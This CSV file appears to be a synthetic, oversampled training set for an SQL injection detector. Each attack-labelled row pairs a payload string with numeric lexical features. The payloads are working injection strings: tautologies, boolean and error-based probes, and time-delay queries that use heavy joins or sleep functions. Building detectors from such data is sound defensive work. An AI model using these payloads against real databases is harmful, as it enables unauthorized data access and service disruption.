id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000247,attack,boolean,"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  'ylit' like 'ylit",nearest_attack_euclidean,R000102,0.19745072422527105,365.22786267500123,41.03255181071446,3.729442712366367,118.6093782714265,35.0,156.4557253500024,55.162759053572294,0.32477763596071235,0.0958316748149577,0.4283605330346936,0.15103015618963633,3.8697927571421635,0.13020724285783658,0.0,0.0,0.0,1.0325518107144591,0.0,34.06510362142892,0.0651036214289184,2.0,4.0,11.032551810714459,0.9674481892855409,0.03255181071445923,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,12.0
SMOTE_000248,attack,boolean,"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'rfln'  =  'rfln",nearest_attack_euclidean,R000055,6.500192551803769,261.72787197663285,31.444048693958905,3.5632937129039997,90.67141567249314,40.83977458871506,99.88453563354794,30.33214608187671,0.3677969480792205,0.1437582571697596,0.37433604273959964,0.11410875201142026,4.0,0.0,0.0,0.0,1.4888097387917807,2.0,0.0,16.84333634308493,0.0,-1.1102230246251565e-16,6.0,3.488809738791781,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.4888097387917808,0.0,2.4664292163753423,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4888097387917809,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.955238955167123
SMOTE_000249,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000153,1.7186552502884578,236.40001150131707,36.531428242819516,3.82581397946986,74.02857635770732,30.594284728458536,93.09143284334635,38.68571757180489,0.31252203258658406,0.13058720627840875,0.39390934447275594,0.16298141666225122,2.9371435143609763,0.0,0.0,0.0,0.0,2.0,0.0,19.87428702872195,0.0,1.4685717571804882,3.468571757180488,10.937143514360976,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.531428242819512,0.0,0.5314282428195118,0.0,0.46857175718048816,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.937143514360977,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.468571757180488
SMOTE_000250,attack,boolean,-7720   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8254  =  8254,nearest_attack_euclidean,R000221,1.0520736860290756,367.5952160255026,29.0,3.176183795775589,80.73701599652237,57.26298400347763,179.0865600231842,50.50865600231842,0.219879545111727,0.1557905830436058,0.4868950997147577,0.13743477212990948,0.24567199884079027,0.0,1.2456719988407903,0.0,0.0,2.0,0.0,37.017312004636835,0.0,-1.1102230246251565e-16,0.0,13.245671998840791,0.24567199884079022,0.0,0.2456719988407903,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.24567199884079013,0.0,1.0,0.7543280011592096,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,17.0
SMOTE_000251,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz",nearest_attack_euclidean,R000069,0.37398581939406556,157.99364745071918,32.0,3.9700407757108027,76.00317627464041,8.0,54.492059313398975,19.498411862679795,0.4822475974452486,0.0506966501907225,0.3437973778408352,0.12325837452319373,4.0,0.0,0.0,0.0,1.0,2.0,0.0,7.498411862679795,0.0,-1.1102230246251565e-16,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.1253970343300512,0.8746029656699489,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000252,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000086,1.0492148218211244,261.9493393988132,37.49638138562951,3.8054896705477512,78.97828831377709,37.0,102.97828831377709,42.992762771259024,0.30141138167072457,0.14134958003125464,0.39309759574505193,0.16414144255296884,0.49638138562951306,0.0,2.0,0.0,0.0,2.0,0.0,22.496381385629512,0.0,2.0,4.0,14.0,0.49638138562951306,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000253,attack,boolean,admin'  )   or '1'  =  '1,nearest_attack_euclidean,R000016,1.8671792814650616,24.738000291945085,12.130999854027461,2.959941327316906,7.0,2.0,9.47600058389014,6.261999708054928,0.2831895616632774,0.08091130333236497,0.38177393335270066,0.254125201651657,4.130999854027464,0.0,0.0,0.13099985402746395,0.130999854027464,1.0,0.0,0.8690001459725369,0.0,-1.1102230246251565e-16,0.0,1.261999708054928,1.0,0.0,0.0,0.0,0.130999854027464,1.0,0.8690001459725359,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000254,attack,boolean,select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',nearest_attack_euclidean,R000007,0.6424669962498778,58.0,22.82181922976521,3.735884688007214,24.35636154046957,5.0,18.17818077023479,10.465457689295638,0.41993726793913055,0.08620689655172414,0.3134169098316343,0.18043892567751102,2.46545768929564,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,6.821819229765214,0.8218192297652134,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.1102230246251565e-16,1.1781807702347868,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.178180770234786
SMOTE_000255,attack,boolean,-8710 or 9323  =  9323#,nearest_attack_euclidean,R000199,0.18953557412024066,23.260943729493164,13.13047186474658,3.331099335101691,2.0,12.0,6.173962486328762,3.086981243164388,0.08617408177063521,0.5170444906238112,0.26452095173703566,0.13226047586851783,0.04349062158219286,0.0,1.0,0.0,0.0,1.0,0.0,0.04349062158219397,0.0,-1.1102230246251565e-16,0.0,2.0,0.04349062158219269,0.0,0.0,1.0000000000000002,0.0,1.0,0.043490621582192746,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000256,attack,boolean,"1%'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000292,1.5492416623049496,166.154047209502,29.230635193665332,3.685662434956075,67.23063519366534,8.769364806334668,64.61531759683267,25.538729612669336,0.404710663661928,0.0527313425457866,0.3889435185735844,0.15361447521870103,4.0,0.0,0.0,0.0,1.0,2.0,0.0,10.0,2.0,1.923412015836671,2.7693648063346683,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000257,attack,boolean,"1""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""vudj"" like ""vudj",nearest_attack_euclidean,R000120,0.5793448724186653,159.59659708493317,31.593658158550543,4.000671688863774,81.8443928901462,8.0,51.12683682898914,18.62536736579783,0.515363241807757,0.05057048166783362,0.31747272564432,0.11659355088008931,0.0,3.9999999999999996,0.0,0.0,1.0,1.0,0.0,7.625367365797828,0.0,-1.1102230246251565e-16,2.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000258,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'atyf'  =  'atyf",nearest_attack_euclidean,R000244,0.38646603497437276,123.12836912972982,28.500709290469434,4.129102723759131,75.62624125832151,3.3751773226173594,30.00141858093887,14.125531967852076,0.6155346768515337,0.0272755722882774,0.24270105931584954,0.11448869154433929,3.0,0.0,0.0,0.0,1.0,1.0,0.0,3.3751773226173585,0.0,-1.1102230246251565e-16,2.375177322617359,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000259,attack,boolean,1'+  (  select bgbq where 1589  =  1589 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +',nearest_attack_euclidean,R000225,0.3460137661743455,375.66023264234923,30.752412759119032,3.283046678418743,91.92712195618248,55.24758724088097,176.40299436499217,52.082529080293654,0.24477123827905972,0.14706027794604806,0.4695253763234878,0.13864310745140443,1.834941839412689,0.0,0.08252908029365558,0.0,0.0,2.0,0.0,36.33011632117462,0.0,-1.1102230246251565e-16,0.0,13.917470919706343,0.9174709197063446,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.9174709197063444,0.0,0.9174709197063445,0.0,1.0,0.08252908029365547,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,17.917470919706346
SMOTE_000260,attack,boolean,"1"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""endx""  =  ""endx",nearest_attack_euclidean,R000273,0.30246287398027555,367.33880676319734,30.338806763197276,3.3736444489585264,102.88706441226756,47.33880676319727,165.0,52.11293558773242,0.2800917265092634,0.12886382034187444,0.449179592636221,0.14186486051264116,0.0,3.9999999999999996,0.11293558773242485,0.0,0.0,3.0,0.0,34.0,0.0,-1.1102230246251565e-16,1.0,13.112935587732425,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,0.0,0.0,1.8870644122675753,0.1129355877324249,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,19.0
SMOTE_000261,attack,boolean,"1' where 6417  =  6417 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000159,0.14286744500996204,261.5073243335786,38.0,3.818038028531868,78.54184200011319,37.0,102.5418420001132,43.4236403333522,0.30024620850774,0.14157221479521365,0.3920768343208515,0.16610474237619488,1.0,0.0,2.0,0.0,0.0,2.0,0.0,22.4236403333522,0.0,2.0,4.0,14.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000262,attack,boolean,"1%'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000222,0.0063785483430442505,211.91626559706873,30.0,3.4970659567999807,111.9225456772886,11.991626559706875,65.0,23.00209336007328,0.5281087630735378,0.05658264709008974,0.30675303686349636,0.10855555297287611,4.0,0.0,0.0,0.0,1.0,2.0,0.0,8.004186720146564,2.0,-1.1102230246251565e-16,5.991626559706875,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000263,attack,boolean,-2504'   )    )     )   or 8723  =  9715,nearest_attack_euclidean,R000193,1.7309294414601526,38.092730251040834,15.523182562760207,2.951590968721402,2.0,12.0,18.092730251040834,6.0,0.05264898576244326,0.31589391457465976,0.4735101423755671,0.15794695728732985,0.5231825627602079,0.4768174372397921,1.0,0.0,0.0,1.0,0.0,2.5231825627602076,0.4768174372397921,-1.1102230246251565e-16,0.0,2.0,0.5231825627602079,0.4768174372397921,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000264,attack,boolean,"1%' or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000082,0.4052615999061391,130.8393925218376,32.720202492720794,4.249031457777698,70.16060747816239,8.860101246360399,34.67878504367522,17.1398987536396,0.5366109786827286,0.06777480935126207,0.2646234220846797,0.1309907898813297,1.0,0.0,2.0,0.0,1.0,1.0,0.0,4.419696260918804,1.0,-1.1102230246251565e-16,2.860101246360399,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.13989875363960136,0.8601012463603988,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000265,attack,boolean,"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000096,1.1720559503843546,96.12565891454437,27.609292635681953,3.685812511393375,35.125658914544374,12.87434108545563,36.56282945727219,11.562829457272187,0.3643846687732574,0.13577165743794992,0.38017088017856493,0.11967279361022778,1.1721220929541394,0.0,0.0,0.0,1.0,1.0,0.0,6.390707364318047,0.0,1.0,1.0,2.0,0.3907073643180464,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000266,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000070,0.028589003834966202,136.5725854793169,29.98100379908075,3.9025071028135843,70.62007598161503,8.047490502298123,40.94301139724225,16.962007598161502,0.5165262488455854,0.05918164987149377,0.3000409835584097,0.12425111772451115,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.0,0.9905018995403756,0.009498100459624403,1.9905018995403756,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000267,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000033,0.03149280490536715,117.27557144293242,32.977954284565406,3.7263434445704857,34.01102285771729,15.0,48.22045715434593,20.044091430869187,0.29011196853817395,0.12795632769688298,0.4110127638014757,0.17091893996346735,6.0,0.0,0.0,1.0,0.0,2.0,0.0,8.044091430869187,2.0,-1.1102230246251565e-16,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0110228577172966,0.9889771422827034,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000268,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",nearest_attack_euclidean,R000025,1.9008187812570585,105.70907406033606,29.56928678622984,4.001832260735287,34.12358107606856,16.0,36.73905905311829,18.8464339311492,0.3167247222282071,0.1732459844431696,0.33527421142714137,0.17475508190148192,4.0,0.0,0.47690440459005334,0.0,0.0,2.0,0.0,6.184764763279572,0.0,1.5230955954099465,1.0,5.615477977049733,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.5230955954099465,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000269,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000109,0.14866959207742078,91.6586512645649,29.544868352753173,3.710586835809164,23.54486835275317,16.0,38.113782911811704,14.0,0.25661277276336386,0.17460333414648152,0.4160059757119833,0.15277791737817137,0.0,3.9999999999999996,1.0,0.0,0.0,1.0568914559058533,0.0,6.0,0.0,0.9431085440941468,1.0,2.0568914559058533,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000270,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000256,1.660714878167447,381.27028573213533,31.87297142678647,3.371179880376847,97.49188570714588,54.508114292854124,176.2702857321353,53.0,0.2561498861189617,0.14278924464136702,0.4619570933824514,0.1391037758572199,0.0,1.7459428535729393,1.0,0.0,0.0,3.0,0.0,36.25405714642706,0.0,-1.1102230246251565e-16,1.0,14.0,0.0,0.4364857133932349,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,19.0
SMOTE_000271,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000276,0.8142295736916049,82.56919954006435,29.23846674332261,3.8822516539179324,21.0,21.0,29.807666283386947,10.76153325667739,0.2545858989100502,0.2545858989100502,0.3605309496432401,0.1302972525366595,1.7615332566773898,0.0,0.4769334866452204,0.0,0.0,2.0,0.0,3.7615332566773905,0.0,0.23846674332261014,1.0,4.0,1.0,0.0,0.2384667433226102,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.7615332566773898,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7615332566773896
SMOTE_000272,attack,boolean,"1  )   as qeav where 8127  =  8127 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000190,0.6627172586471,381.78543372334127,31.0,3.3515949377108907,101.3931096489928,55.5356301170024,173.4996072126779,51.357086744668266,0.2656915114245149,0.14544764230551377,0.45434913342865196,0.13451171284131938,0.0,0.0,1.8214566276658668,0.0,0.0,3.0,0.0,35.5356301170024,0.0,-1.1102230246251565e-16,1.0,14.821456627665867,0.0,0.0,0.821456627665867,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,0.821456627665867,0.0,1.0,0.17854337233413298,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,19.0
SMOTE_000273,attack,boolean,"1"" where 5216  =  5216 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000251,1.5281605851477547,134.014104573556,29.6267630716945,4.049589523614856,64.7112717861575,14.338034857852001,35.422543572315,19.5422543572315,0.4851062640390188,0.10514455241177156,0.2630780641233078,0.14667111942590183,0.0,1.0,2.0,0.0,1.0,1.5422543572315,0.0,4.542254357231499,0.45774564276850005,5.0,4.0,4.5422543572315,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.5422543572315,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5422543572315
